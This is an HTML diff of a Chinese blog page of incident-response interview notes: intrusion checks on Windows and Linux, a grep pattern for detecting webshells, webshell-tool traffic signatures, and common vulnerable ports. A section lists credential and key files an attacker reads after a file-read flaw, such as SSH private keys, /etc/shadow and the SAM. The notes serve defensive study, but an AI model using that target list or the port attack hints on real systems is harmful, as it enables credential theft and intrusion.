@@ -288,97 +288,373 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="应急响应基本思路流程"><a href="#应急响应基本思路流程" class="headerlink" title="应急响应基本思路流程"></a>应急响应基本思路流程</h3><p>  1.收集信息  收集客户信息和中毒主机信息 包括样本<br>  2.判断类型  判断是何种安全事件（挖矿、勒索、Dos、断网等）<br>  3.抑制范围  隔离，使受害面不继续扩大<br>  4.深入分析  日志分析、进程分析、启动项分析、样本分析<br>  5.清理处置  杀掉进程、打补丁、删文件、删除后门、删除异常启动服务<br>  6.产出报告  整理输出完整的安全事件报告</p>
-<h3 id="Windows入侵排查思路"><a href="#Windows入侵排查思路" class="headerlink" title="Windows入侵排查思路"></a>Windows入侵排查思路</h3><p>  1.检查系统账号安全<br>    &lt;1&gt;是否有弱口令 连接对外开发的端口（可以用netstat -ano 查看）<br>    &lt;2&gt; lusrmgr.msc 查看服务器是否存在可疑账号、新增账号<br>    &lt;3&gt;通过D盾或者注册表查看服务器是否存在隐藏账号或克隆账号<br>    &lt;4&gt;结合日志查看管理员登录事件、用户名是否正常（eventvwr.msc打开事件查看器，导出后使用LogParer分析）</p>
-<p>  2.检查异常端口、进程<br>    netstat -ano 检查端口连接情况<br>    使用任务管理器或者 process exp/processmon 等查看进程<br>  3.检查启动项、计划任务、服务</p>
-<p>  4.检查系统相关信息、版本、补丁<br>    systeminfo<br>  5.查找可疑目录及文件<br>    可以通过 %UserProfile%\Recent 查看最近访问，查看浏览器下载目录/历史记录/修改文件的时间<br>  6.日志分析<br>    eventvwr.msc 导出到LogParser</p>
-<p>Linux入侵排查思路<br>  &lt;1&gt; 账号安全<br>    who 查看当前登录用户（tty本地登陆 pts远程登录）<br>    w   查看系统信息，想知道某一时刻用户的行为<br>    cat /etc/passwd 用户信息文件<br>      root:x:0:0:root:/root:/bin/bash<br>      account:password:UID:GID:GECOS:directory:shell<br>      用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell<br>      注意：无密码只允许本机登陆，远程不允许登陆</p>
+        <h3 id="应急响应基本思路流程">应急响应基本思路流程</h3>
+<p>1.收集信息 收集客户信息和中毒主机信息 包括样本 2.判断类型
+判断是何种安全事件（挖矿、勒索、Dos、断网等） 3.抑制范围
+隔离，使受害面不继续扩大 4.深入分析
+日志分析、进程分析、启动项分析、样本分析 5.清理处置
+杀掉进程、打补丁、删文件、删除后门、删除异常启动服务 6.产出报告
+整理输出完整的安全事件报告</p>
+<h3 id="windows入侵排查思路">Windows入侵排查思路</h3>
+<p>1.检查系统账号安全 &lt;1&gt;是否有弱口令
+连接对外开发的端口（可以用netstat -ano 查看） &lt;2&gt; lusrmgr.msc
+查看服务器是否存在可疑账号、新增账号
+&lt;3&gt;通过D盾或者注册表查看服务器是否存在隐藏账号或克隆账号
+&lt;4&gt;结合日志查看管理员登录事件、用户名是否正常（eventvwr.msc打开事件查看器，导出后使用LogParer分析）</p>
+<p>2.检查异常端口、进程 netstat -ano 检查端口连接情况 使用任务管理器或者
+process exp/processmon 等查看进程 3.检查启动项、计划任务、服务</p>
+<p>4.检查系统相关信息、版本、补丁 systeminfo 5.查找可疑目录及文件
+可以通过
+%UserProfile%查看最近访问，查看浏览器下载目录/历史记录/修改文件的时间
+6.日志分析 eventvwr.msc 导出到LogParser</p>
+<p>Linux入侵排查思路 &lt;1&gt; 账号安全 who
+查看当前登录用户（tty本地登陆 pts远程登录） w
+查看系统信息，想知道某一时刻用户的行为 cat /etc/passwd 用户信息文件
+root:x:0:0:root:/root:/bin/bash
+account:password:UID:GID:GECOS:directory:shell
+用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell
+注意：无密码只允许本机登陆，远程不允许登陆</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd 存储一般的用户信息，任何人都可以访问；</span><br><span class="line">/etc/shadow 存储用户的密码信息，只有 root 用户可以访问</span><br><span class="line"></span><br><span class="line">cat /etc/shadow 影子文件</span><br><span class="line">  root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br></pre></td></tr></table></figure>
-
 <p>用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</p>
-<p>  &lt;2&gt; 历史命令<br>      通过 .bash_history 查看帐号执行过的系统命令<br>      1、root的历史命令 histroy<br>      2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号的历史命令<br>      <code>history -c</code> 清除历史操作命令(但此命令并不会清除保存在文件中的记录，需要手动删除.bash_profile文件中的记录)</p>
-<p>  &lt;3&gt; 检查异常端口<br>    <code>netstat -antlp|more</code><br>    查看下pid所对应的进程文件路径，<br>    运行<code>ls -l /proc/$PID/exe或file /proc/$PID/exe</code>（$PID 为对应的pid 号）</p>
-<p>  &lt;4&gt; 检查异常进程<br>   <code> ps aux | grep pid</code></p>
-<p>  &lt;5&gt; 检测开机启动项<br>  <code> /etc/rc.local</code><br>    <code>/etc/rc.d/rc[0~6].d</code></p>
-<p>  &lt;6&gt; 检查定时任务<br>   <code>crontab -l</code>列出某个用户cron服务的详细内容<br>    Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root<br>   <code>crontab -r </code>删除每个用户cront任务(谨慎：删除所有的计划任务)<br>    <code>crontab -e</code> 使用编辑器编辑当前的crontab文件<br>    如：*/1 * * * * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件</p>
-<p>  &lt;7&gt; 检查服务<br>    <code>chkconfig --list</code> 命令，可以查看系统运行的服务</p>
-<h3 id="框架漏洞-amp-常见命令注入漏洞？"><a href="#框架漏洞-amp-常见命令注入漏洞？" class="headerlink" title="框架漏洞&amp;常见命令注入漏洞？"></a>框架漏洞&amp;常见命令注入漏洞？</h3><p>  &lt;1&gt;Struts2 OGNL注入<br>  &lt;2&gt;weblogic<br>  &lt;3&gt;fastjson<br>  &lt;4&gt;TP5 RCE<br>  ……</p>
-<h3 id="常见安全工具、设备"><a href="#常见安全工具、设备" class="headerlink" title="常见安全工具、设备"></a>常见安全工具、设备</h3><p>  工具 nmap wireshark Burpsuite Awvs Oneforall CS MSF behind antsword<br>  设备 ？？？ 没接触过</p>
-<h3 id="DDOS-CC应急思路以及如何防范"><a href="#DDOS-CC应急思路以及如何防范" class="headerlink" title="DDOS CC应急思路以及如何防范"></a>DDOS CC应急思路以及如何防范</h3><p>  增加硬件设备<br>  上云<br>  购买专业安全公司的安全服务<br>  隐藏服务器的真实 IP、上云 WAF、CDN、 负载均衡等设备<br>  过滤不必要的服务端口<br>  使用硬件防火墙<br>  限制特定流量</p>
-<h3 id="服务器存在webshell，如何处理？"><a href="#服务器存在webshell，如何处理？" class="headerlink" title="服务器存在webshell，如何处理？"></a>服务器存在webshell，如何处理？</h3><p>  1.使用D盾或者河马(支持多平台，但需要联网)进行查杀<br>  2.事件分析 分析创建时间点的日志<br>  3.漏洞分析 进程分析 样本分析<br>  4.漏洞复现<br>  5.漏洞修复  清除webshell和残留文件；配置必要的防火墙并开启防火墙策略；防止暴露不必要的服务；排查程序存在的漏洞并及时修补</p>
-<h3 id="排查shell-应该用什么命令来进行排查"><a href="#排查shell-应该用什么命令来进行排查" class="headerlink" title="排查shell 应该用什么命令来进行排查"></a>排查shell 应该用什么命令来进行排查</h3><p>  find<br>  <code>find /var/www/html -name &quot;*.php&quot; |xargs egrep &#39;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&#39;</code></p>
-<h3 id="如何检测webshell"><a href="#如何检测webshell" class="headerlink" title="如何检测webshell"></a>如何检测webshell</h3><p>  &lt;1&gt; 主机层面<br>  静态检查(特征码、危险函数)、动态检查、日志检测<br>  &lt;2&gt; 流量层面<br>  webshell流量特征</p>
-<h3 id="Webshell管理工具的流量特征"><a href="#Webshell管理工具的流量特征" class="headerlink" title="Webshell管理工具的流量特征"></a>Webshell管理工具的流量特征</h3><p>  &lt;1&gt;菜刀<br>    只使用url编码+base64编码<br>    shell 特征就是传输参数名为 z0，还存在int_set(“display_erros”,”0”)字符串特征<br>  &lt;2&gt;蚁剑<br>    默认的蚁剑shell连接时会请求两次，其请求体经过url编码<br>    第一次请求  关闭报错和 magic_qoutes 然后去获取主机信息<br>    第二次请求  列出主机目录<br>  &lt;3&gt;冰蝎2.0<br>    使用AES加密发送3次请求<br>    第一次请求  服务端产生密钥写入session， session和当前会话绑定，不同客户端的密钥也不同<br>    第二次请求  获取 key<br>    第三次请求  使用 key的AES加密进行通信<br>  &lt;4&gt;冰蝎3.0<br>    使用AES加密发起2次请求<br>    与2.0相比 少了动态密钥获取的请求，不再使用随机生成的key，改为取连接密码mad＋salt的前16为作为密钥<br>    第一次请求  判断是否可以建立连接<br>    第二次请求  发送phpinfo等代码执行，获取网站信息<br>  &lt;5&gt;哥斯拉<br>    支持 n 种加密<br>    采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求<br>    第一次请求  数据超级长，建立 session<br>    第二三次请求确认连接</p>
-<h3 id="常见端口漏洞"><a href="#常见端口漏洞" class="headerlink" title="常见端口漏洞"></a>常见端口漏洞</h3><p>  &lt;1&gt;远程管理端口<br>    22ssh(弱口令、暴力破解) 23Telnet(弱口令、明文传输) 3389RDP(暴力破解)<br>  &lt;2&gt;Web中间件/服务端口<br>    1090/1099 RMI     (JAVA反序列化远程RCE)<br>    7001 Weblogic     (弱口令、SSRF、反序列化)<br>    8080 Tomcat       (弱口令)<br>    8080 Jenkin       (未授权访问、命令执行)<br>    9043 WebSphere    (控制台弱口令、远程代码执行)<br>    50070 Hadoop      (未授权访问)<br>  &lt;3&gt;数据库端口<br>    389 Ldap    (弱口令、未授权范围) 使用LdapBrower工具直接炼乳<br>    1433 Mssql  (弱口令、暴力破解)<br>    1521 Oracle (弱口令、暴力破解)<br>    3306 Mysql  (弱口令、暴力破解) 利用日志写入webshell、udf提权、mof提权等<br>    5432 PostgreSQL (弱口令、高权限命令执行)<br>    6379 Redis  (未授权访问)<br>    27017 Mongodb   (未授权访问、弱口令)</p>
-<h3 id="挖矿病毒判断-amp-挖矿常见手段-amp-处理"><a href="#挖矿病毒判断-amp-挖矿常见手段-amp-处理" class="headerlink" title="挖矿病毒判断&amp;挖矿常见手段&amp;处理"></a>挖矿病毒判断&amp;挖矿常见手段&amp;处理</h3><p>  怎么发现有没有被攻击，<br>    攻击判断可以建立在设备的基础上，利用设备的告警，<br>    如果没用设备的话可考虑如下<br>      网站被攻击:<br>        网站首页被篡改 网站跳转到别的网站 被植入webshell DDOS\CC攻击<br>      服务器被黑:<br>        服务器中木马病毒 服务器管理员账户密码被改 服务器被远控 服务器被流量攻击</p>
-<h3 id="数据包或者日志，你的分析思路是什么"><a href="#数据包或者日志，你的分析思路是什么" class="headerlink" title="数据包或者日志，你的分析思路是什么"></a>数据包或者日志，你的分析思路是什么</h3><p>  分析报文中的host 和 网站目录路径是否可疑<br>  通过威胁平台分析host 是否为恶意IP<br>  使用wireshark 对数据包进行分析<br>  工具 wireshark<br>  网站 微步在线等威胁情报平台</p>
-<h3 id="文件上传和命令执行，有看过相关日志吗"><a href="#文件上传和命令执行，有看过相关日志吗" class="headerlink" title="文件上传和命令执行，有看过相关日志吗"></a>文件上传和命令执行，有看过相关日志吗</h3><p>  系统日志  看有没有web容器做了危险行为 反弹shell之类<br>  网络应用日志  查找异常网站文件 webshell</p>
-<h3 id="windows日志分析工具"><a href="#windows日志分析工具" class="headerlink" title="windows日志分析工具"></a>windows日志分析工具</h3><p>  Log Parser 、 LOgParse Lizard、Event Log Explorer</p>
-<h3 id="Linux日志分析技巧命令"><a href="#Linux日志分析技巧命令" class="headerlink" title="Linux日志分析技巧命令"></a>Linux日志分析技巧命令</h3><p>  grep/awk/sort等命令配合使用</p>
-<h3 id="给你一个比较大的日志，应该如何分析"><a href="#给你一个比较大的日志，应该如何分析" class="headerlink" title="给你一个比较大的日志，应该如何分析"></a>给你一个比较大的日志，应该如何分析</h3><p>  时间日期、url 、状态码、UA 缩小范围  然后再去用工具</p>
-<h3 id="Windows在应急响应中的安全日志以及对应场景"><a href="#Windows在应急响应中的安全日志以及对应场景" class="headerlink" title="Windows在应急响应中的安全日志以及对应场景"></a>Windows在应急响应中的安全日志以及对应场景</h3><h3 id="设备误报如何处理"><a href="#设备误报如何处理" class="headerlink" title="设备误报如何处理"></a>设备误报如何处理</h3><h3 id="Windows和Linux的日志文件放在哪里"><a href="#Windows和Linux的日志文件放在哪里" class="headerlink" title="Windows和Linux的日志文件放在哪里"></a>Windows和Linux的日志文件放在哪里</h3><p>  Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志<br>    系统日志：<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code><br>    应用程序日志：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code><br>    安全日志：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code><br>  Linux<br>    日志默认存放位置：<code>/var/log/</code><br>    查看日志配置情况：<code>more /etc/rsyslog.conf</code></p>
-<p> 常见中间件的配置文件路径</p>
-<p>  <code>apache：/etc/httpd/conf</code><br>  <code>nginx：/etc/nginx</code><br>  <code>iis7：C:\Windows\System32\inetsrv\config\</code></p>
-<h3 id="如何查看系统内存shell"><a href="#如何查看系统内存shell" class="headerlink" title="如何查看系统内存shell"></a>如何查看系统内存shell</h3><h3 id="Java-内存马排查"><a href="#Java-内存马排查" class="headerlink" title="Java 内存马排查"></a>Java 内存马排查</h3><h3 id="如何修改WEB端口？如果不能修改端口还有什么利用方法？"><a href="#如何修改WEB端口？如果不能修改端口还有什么利用方法？" class="headerlink" title="如何修改WEB端口？如果不能修改端口还有什么利用方法？"></a>如何修改WEB端口？如果不能修改端口还有什么利用方法？</h3><h3 id="获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈"><a href="#获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈" class="headerlink" title="获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈"></a>获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows：</span><br><span class="line">  C:\boot.ini //查看系统版本</span><br><span class="line">  C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">  C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">  C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">  C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">  C:\Windows\php.ini //php配置信息</span><br><span class="line">  C:\Windows\my.ini //Mysql配置信息</span><br><span class="line">  C:\Windows\win.ini //Windows系统的一个基本系统配置文件</span><br></pre></td></tr></table></figure>
-
+<p>&lt;2&gt; 历史命令 通过 .bash_history 查看帐号执行过的系统命令
+1、root的历史命令 histroy 2、打开 /home 各帐号目录下的
+.bash_history，查看普通帐号的历史命令 <code>history -c</code>
+清除历史操作命令(但此命令并不会清除保存在文件中的记录，需要手动删除.bash_profile文件中的记录)</p>
+<p>&lt;3&gt; 检查异常端口 <code>netstat -antlp|more</code>
+查看下pid所对应的进程文件路径，
+运行<code>ls -l /proc/$PID/exe或file /proc/$PID/exe</code>（$PID
+为对应的pid 号）</p>
+<p>&lt;4&gt; 检查异常进程 <code>ps aux | grep pid</code></p>
+<p>&lt;5&gt; 检测开机启动项 <code>/etc/rc.local</code>
+<code>/etc/rc.d/rc[0~6].d</code></p>
+<p>&lt;6&gt; 检查定时任务
+<code>crontab -l</code>列出某个用户cron服务的详细内容
+Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如:
+/var/spool/cron/root
+<code>crontab -r</code>删除每个用户cront任务(谨慎：删除所有的计划任务)
+<code>crontab -e</code> 使用编辑器编辑当前的crontab文件 如：<em>/1 </em>
+* * * echo "hello world" &gt;&gt; /tmp/test.txt 每分钟写入文件</p>
+<p>&lt;7&gt; 检查服务 <code>chkconfig --list</code>
+命令，可以查看系统运行的服务</p>
+<h3 id="框架漏洞常见命令注入漏洞">框架漏洞&amp;常见命令注入漏洞？</h3>
+<p>&lt;1&gt;Struts2 OGNL注入 &lt;2&gt;weblogic &lt;3&gt;fastjson
+&lt;4&gt;TP5 RCE ......</p>
+<h3 id="常见安全工具设备">常见安全工具、设备</h3>
+<p>工具 nmap wireshark Burpsuite Awvs Oneforall CS MSF behind antsword
+设备 ？？？ 没接触过</p>
+<h3 id="ddos-cc应急思路以及如何防范">DDOS CC应急思路以及如何防范</h3>
+<p>增加硬件设备 上云 购买专业安全公司的安全服务 隐藏服务器的真实
+IP、上云 WAF、CDN、 负载均衡等设备 过滤不必要的服务端口 使用硬件防火墙
+限制特定流量</p>
+<h3 id="服务器存在webshell如何处理">服务器存在webshell，如何处理？</h3>
+<p>1.使用D盾或者河马(支持多平台，但需要联网)进行查杀 2.事件分析
+分析创建时间点的日志 3.漏洞分析 进程分析 样本分析 4.漏洞复现 5.漏洞修复
+清除webshell和残留文件；配置必要的防火墙并开启防火墙策略；防止暴露不必要的服务；排查程序存在的漏洞并及时修补</p>
+<h3 id="排查shell-应该用什么命令来进行排查">排查shell
+应该用什么命令来进行排查</h3>
+<p>find
+<code>find /var/www/html -name "*.php" |xargs egrep 'assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\('</code></p>
+<h3 id="如何检测webshell">如何检测webshell</h3>
+<p>&lt;1&gt; 主机层面 静态检查(特征码、危险函数)、动态检查、日志检测
+&lt;2&gt; 流量层面 webshell流量特征</p>
+<h3 id="webshell管理工具的流量特征">Webshell管理工具的流量特征</h3>
+<p>&lt;1&gt;菜刀 只使用url编码+base64编码 shell 特征就是传输参数名为
+z0，还存在int_set("display_erros","0")字符串特征 &lt;2&gt;蚁剑
+默认的蚁剑shell连接时会请求两次，其请求体经过url编码 第一次请求
+关闭报错和 magic_qoutes 然后去获取主机信息 第二次请求 列出主机目录
+&lt;3&gt;冰蝎2.0 使用AES加密发送3次请求 第一次请求
+服务端产生密钥写入session，
+session和当前会话绑定，不同客户端的密钥也不同 第二次请求 获取 key
+第三次请求 使用 key的AES加密进行通信 &lt;4&gt;冰蝎3.0
+使用AES加密发起2次请求 与2.0相比
+少了动态密钥获取的请求，不再使用随机生成的key，改为取连接密码mad＋salt的前16为作为密钥
+第一次请求 判断是否可以建立连接 第二次请求
+发送phpinfo等代码执行，获取网站信息 &lt;5&gt;哥斯拉 支持 n 种加密
+采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求
+第一次请求 数据超级长，建立 session 第二三次请求确认连接</p>
+<h3 id="常见端口漏洞">常见端口漏洞</h3>
+<p>&lt;1&gt;远程管理端口 22ssh(弱口令、暴力破解)
+23Telnet(弱口令、明文传输) 3389RDP(暴力破解) &lt;2&gt;Web中间件/服务端口
+1090/1099 RMI (JAVA反序列化远程RCE) 7001 Weblogic
+(弱口令、SSRF、反序列化) 8080 Tomcat (弱口令) 8080 Jenkin
+(未授权访问、命令执行) 9043 WebSphere (控制台弱口令、远程代码执行) 50070
+Hadoop (未授权访问) &lt;3&gt;数据库端口 389 Ldap (弱口令、未授权范围)
+使用LdapBrower工具直接炼乳 1433 Mssql (弱口令、暴力破解) 1521 Oracle
+(弱口令、暴力破解) 3306 Mysql (弱口令、暴力破解)
+利用日志写入webshell、udf提权、mof提权等 5432 PostgreSQL
+(弱口令、高权限命令执行) 6379 Redis (未授权访问) 27017 Mongodb
+(未授权访问、弱口令)</p>
+<h3 id="挖矿病毒判断挖矿常见手段处理">挖矿病毒判断&amp;挖矿常见手段&amp;处理</h3>
+<p>怎么发现有没有被攻击，
+攻击判断可以建立在设备的基础上，利用设备的告警，
+如果没用设备的话可考虑如下 网站被攻击: 网站首页被篡改 网站跳转到别的网站
+被植入webshell DDOS 服务器被黑: 服务器中木马病毒
+服务器管理员账户密码被改 服务器被远控 服务器被流量攻击</p>
+<h3 id="数据包或者日志你的分析思路是什么">数据包或者日志，你的分析思路是什么</h3>
+<p>分析报文中的host 和 网站目录路径是否可疑 通过威胁平台分析host
+是否为恶意IP 使用wireshark 对数据包进行分析 工具 wireshark 网站
+微步在线等威胁情报平台</p>
+<h3 id="文件上传和命令执行有看过相关日志吗">文件上传和命令执行，有看过相关日志吗</h3>
+<p>系统日志 看有没有web容器做了危险行为 反弹shell之类 网络应用日志
+查找异常网站文件 webshell</p>
+<h3 id="windows日志分析工具">windows日志分析工具</h3>
+<p>Log Parser 、 LOgParse Lizard、Event Log Explorer</p>
+<h3 id="linux日志分析技巧命令">Linux日志分析技巧命令</h3>
+<p>grep/awk/sort等命令配合使用</p>
+<h3 id="给你一个比较大的日志应该如何分析">给你一个比较大的日志，应该如何分析</h3>
+<p>时间日期、url 、状态码、UA 缩小范围 然后再去用工具</p>
+<h3 id="windows在应急响应中的安全日志以及对应场景">Windows在应急响应中的安全日志以及对应场景</h3>
+<h3 id="设备误报如何处理">设备误报如何处理</h3>
+<h3 id="windows和linux的日志文件放在哪里">Windows和Linux的日志文件放在哪里</h3>
+<p>Windows
+主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志
+系统日志：<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code>
+应用程序日志：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code>
+安全日志：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code>
+Linux 日志默认存放位置：<code>/var/log/</code>
+查看日志配置情况：<code>more /etc/rsyslog.conf</code></p>
+<p>常见中间件的配置文件路径</p>
+<p><code>apache：/etc/httpd/conf</code> <code>nginx：/etc/nginx</code>
+<code>iis7：C:\Windows\System32\inetsrv\config\</code></p>
+<h3 id="如何查看系统内存shell">如何查看系统内存shell</h3>
+<h3 id="java-内存马排查">Java 内存马排查</h3>
+<h3 id="如何修改web端口如果不能修改端口还有什么利用方法">如何修改WEB端口？如果不能修改端口还有什么利用方法？</h3>
+<h3 id="获得文件读取漏洞通常会读哪些文件linux和windows都谈谈">获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows：</span><br><span class="line">  C:\boot.ini //查看系统版本</span><br><span class="line">  C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">  C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">  C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">  C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">  C:\Windows\php.ini //php配置信息</span><br><span class="line">  C:\Windows\my.ini //Mysql配置信息</span><br><span class="line">  C:\Windows\win.ini //Windows系统的一个基本系统配置文件</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Linux：</span><br><span class="line">  /root/.ssh/authorized_keys</span><br><span class="line">  /root/.ssh/id_rsa</span><br><span class="line">  /root/.ssh/id_ras.keystore</span><br><span class="line">  /root/.ssh/known_hosts //记录每个访问计算机用户的公钥</span><br><span class="line">  /etc/passwd</span><br><span class="line">  /etc/shadow</span><br><span class="line">  /etc/my.cnf //mysql配置文件</span><br><span class="line">  /etc/httpd/conf/httpd.conf //apache配置文件</span><br><span class="line">  /root/.bash_history //用户历史命令记录文件</span><br><span class="line">  /root/.mysql_history //mysql历史命令记录文件</span><br><span class="line">  /proc/mounts //记录系统挂载设备</span><br><span class="line">  /porc/config.gz //内核配置文件</span><br><span class="line">  /var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">  /porc/self/cmdline //当前进程的cmdline参数</span><br></pre></td></tr></table></figure>
-
-<h3 id="windows端口进程间转换"><a href="#windows端口进程间转换" class="headerlink" title="windows端口进程间转换"></a>windows端口进程间转换</h3><p>  netstat -ano | findstr “port”查看目前的网络连接，定位可疑的 ESTABLISHED<br>  根据netstat定位出的 pid，再通过tasklist命令进行进程定位tasklist | findstr “PID”</p>
-<h3 id="文件上传攻击特征？"><a href="#文件上传攻击特征？" class="headerlink" title="文件上传攻击特征？"></a>文件上传攻击特征？</h3><p>  上传文件的接口  对用户上传文件类型校验不严格</p>
-<h3 id="文件上传加固方法？"><a href="#文件上传加固方法？" class="headerlink" title="文件上传加固方法？"></a>文件上传加固方法？</h3><p>  后端限制文件上传白名单，头像不允许上传 svg<br>  上传后文件随机重命名，不要输出保存文件位置<br>  图片文件可以二次渲染，使用对象存储 oss<br>  文件目录取消执行权限，PHP 设置 basedir</p>
-<h3 id="你还用过其他态势感知的产品吗？"><a href="#你还用过其他态势感知的产品吗？" class="headerlink" title="你还用过其他态势感知的产品吗？"></a>你还用过其他态势感知的产品吗？</h3><p>  ips，ids，hids，堡垒机</p>
-<h3 id="钓鱼邮件处置"><a href="#钓鱼邮件处置" class="headerlink" title="钓鱼邮件处置"></a>钓鱼邮件处置</h3><p>  屏蔽办公区域对钓鱼邮件内容涉及站点、URL 访问<br>  根据办公环境实际情况可以在上网行为管理、路由器、交换机上进行屏蔽<br>  对访问钓鱼网站的内网 IP 进行记录，以便后续排查溯源可能的后果<br>  根据钓鱼邮件发件人进行日志回溯</p>
-<h3 id="如何查看区分是扫描流量和手动流量"><a href="#如何查看区分是扫描流量和手动流量" class="headerlink" title="如何查看区分是扫描流量和手动流量"></a>如何查看区分是扫描流量和手动流量</h3><p>  扫描数据量大，请求有规律，手动扫描间隔较少</p>
-<h3 id="️入侵检测-amp-防御"><a href="#️入侵检测-amp-防御" class="headerlink" title="️入侵检测&amp;防御"></a>️入侵检测&amp;防御</h3><h3 id="WAF产品如何来拦截攻击？"><a href="#WAF产品如何来拦截攻击？" class="headerlink" title="WAF产品如何来拦截攻击？"></a>WAF产品如何来拦截攻击？</h3><p>  云 Waf<br>  Web 防护软件<br>  硬件 Web 防火墙</p>
-<h3 id="WAF有哪些防护方式？"><a href="#WAF有哪些防护方式？" class="headerlink" title="WAF有哪些防护方式？"></a>WAF有哪些防护方式？</h3><p>  Web基础防护<br>    可防范常规的 web 应用攻击，如 SQL 注入攻击、XSS 跨站攻击等，可检测 webshell，检查 HTTP 上传通道中的网页木马，打开开关即实时生效<br>  CC 攻击防护<br>    可根据 IP、Cookie 或者 Referer 字段名设置灵活的限速策略，有效缓解 CC 攻击<br>  精准访问防护<br>    对常见 HTTP 字段进行条件组合， 支持定制化防护策略如CSRF防护，通过自定义规则的配置，更精准的识别恶意伪造请求、保护网站敏感信息、提高防护精准性<br>  IP 黑白名单<br>    添加终拦截与始终放行的黑白名单 IP，增加防御准确性<br>  地理位置访问控制<br>    添加地理位置访问控制规则，针对来源 IP 进行自定义访问控制<br>  网页防篡改<br>    对网站的静态网页进行缓存配置，当用户访问时返回给用户缓存的正常页面，并随机检测网页是否被篡改<br>  网站反爬虫<br>    动态分析网站业务模型，结合人机识别技术和数据风控手段，精准识别爬虫行为<br>  误报屏蔽<br>    针对特定请求忽略某些攻击检测规则，用于处理误报事件<br>  隐私屏蔽<br>    隐私信息屏蔽，避免用户的密码等信息出现在事件日志中<br>  防敏感信息泄露<br>    防止在页面中泄露用户的敏感信息，例如：用户的身份证号码、手机号码、电子邮箱等</p>
-<h3 id="不安全的第三方组件的漏洞如何做前置规避？"><a href="#不安全的第三方组件的漏洞如何做前置规避？" class="headerlink" title="不安全的第三方组件的漏洞如何做前置规避？"></a>不安全的第三方组件的漏洞如何做前置规避？</h3><h3 id="如果现在要你写一个检测命令注入的脚本？"><a href="#如果现在要你写一个检测命令注入的脚本？" class="headerlink" title="如果现在要你写一个检测命令注入的脚本？"></a>如果现在要你写一个检测命令注入的脚本？</h3><h3 id="️溯源基本步骤"><a href="#️溯源基本步骤" class="headerlink" title="️溯源基本步骤"></a>️溯源基本步骤</h3><p>  &lt;1&gt; 攻击源捕获<br>    安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等<br>    日志与流量分析，异常的通讯流量、攻击源与攻击目标等<br>    服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等<br>    邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等<br>    蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</p>
-<p>  &lt;2&gt; 溯源反制手段</p>
-<p>  &lt;3&gt; 攻击者画像</p>
+<h3 id="windows端口进程间转换">windows端口进程间转换</h3>
+<p>netstat -ano | findstr “port”查看目前的网络连接，定位可疑的
+ESTABLISHED 根据netstat定位出的
+pid，再通过tasklist命令进行进程定位tasklist | findstr “PID”</p>
